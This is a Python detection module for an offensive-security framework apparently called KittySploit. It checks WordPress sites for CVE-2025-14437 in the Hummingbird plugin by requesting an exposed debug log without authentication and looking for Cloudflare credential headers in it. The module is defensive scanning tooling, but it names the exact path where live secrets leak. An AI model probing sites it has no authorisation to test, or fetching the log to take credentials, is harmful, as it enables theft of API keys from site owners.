#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Hummingbird Performance WordPress plugin <= 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Hummingbird <= 3.18.0 - Sensitive Information Exposure via Log File Detection',
        'description': "Hummingbird Performance WordPress plugin <= 3.18.0 contains a sensitive information exposure caused by improper handling in the 'request' function, letting unauthenticated attackers extract sensitive data including Cloudflare API credentials, exploit requires no authentication.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'wordpress', 'wp-plugin', 'hummingbird', 'exposure', 'cloudflare', 'wpmudev', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/hummingbird-performance/hummingbird-3180-unauthenticated-sensitive-information-exposure-via-log-files',
            'https://wpscan.com/vulnerability/cve-2025-14437',
            'https://plugins.trac.wordpress.org/changeset/3421187/hummingbird-performance',
        ],
        'cve': 'CVE-2025-14437',
    }

    def run(self):
        path = '/wp-content/wphb-logs/api-debug.log'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('WPHB', 'X-Auth-Key', 'X-Auth-Email', 'Authorization',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='WordPress Hummingbird <= 3.18.0 - Sensitive Information Exposure via Log File detected', path=path)
            return True
        return False

